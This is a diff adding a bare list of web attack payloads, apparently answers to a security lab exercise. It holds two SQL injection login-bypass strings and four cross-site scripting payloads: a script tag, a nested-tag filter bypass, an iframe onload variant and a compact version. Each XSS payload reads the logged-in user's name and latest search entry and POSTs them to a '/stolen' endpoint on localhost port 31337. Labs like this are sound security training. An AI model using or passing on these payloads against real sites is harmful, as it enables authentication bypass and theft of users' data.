@@ -1,0 +1,17 @@
+1. 1' or '1'='1'-- -
+2. \' or 1 = 1 -- -
+
+
+2
+
+1)
+<script>window.onload=(e)=>{xx=document.getElementById('logged-in-user').textContent;hsl=document.getElementsByClassName('history-item list-group-item')[1].textContent;if(xx==undefined){xx='';}if(hsl==undefined){hsl='';}const report_url='https://localhost:31337/stolen?user='+xx+'&last_search='+hsl;$.ajax({type: 'POST',url: report_url,});}</script>
+
+2) 
+<sscriptcript>window.onload=(e)=>{xx=document.getElementById('logged-in-user').textContent;hsl=document.getElementsByClassName('history-item list-group-item')[1].textContent;if(xx==undefined){xx='';}if(hsl==undefined){hsl='';}const report_url='https://localhost:31337/stolen?user='+xx+'&last_search='+hsl;$.ajax({type: 'POST',url: report_url,});}</sscriptcript>
+
+3)
+<iframe src=x onload="window.onload=(e)=>{xx=document.getElementById('logged-in-user').textContent;hsl=document.getElementsByClassName('history-item list-group-item')[1].textContent;if(xx==undefined){xx='';}if(hsl==undefined){hsl='';}const report_url='https://localhost:31337/stolen?user='+xx+'&last_search='+hsl;$.ajax({type: 'POST',url: report_url,});}"></iframe>
+
+4)
+<script> window.onload=(e)=>{$.ajax({type: `POST`,url: `https://localhost:31337/stolen?user=`+document.getElementById(`logged-in-user`).textContent+`&last_search=`+document.getElementsByClassName(`history-item list-group-item`)[1].textContent})}</script>
